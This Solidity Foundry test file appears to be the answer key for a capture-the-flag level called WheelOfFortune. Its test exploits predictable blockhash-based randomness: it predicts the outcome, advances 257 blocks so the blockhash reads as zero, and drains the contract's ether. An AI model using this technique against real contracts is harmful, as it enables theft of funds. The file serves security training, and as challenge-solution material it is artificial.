// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/03_WheelOfFortune/WheelOfFortune.sol";

// forge test --match-contract WheelOfFortuneTest -vvvv
contract WheelOfFortuneTest is BaseTest {
    WheelOfFortune instance;

    function setUp() public override {
        super.setUp();
        instance = new WheelOfFortune{value: 0.01 ether}();
        vm.roll(48743985);
    }

    function testExploitLevel() public {
        bytes32 zeroHash = keccak256(abi.encode(bytes32(0)));
        uint256 predictedNumber = uint256(zeroHash) % 100;
        instance.spin{value: 0.01 ether}(predictedNumber);
        uint256 blocksToAdvance = 257;
        vm.roll(block.number + blocksToAdvance);

        instance.spin{value: 0.01 ether}(0);

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
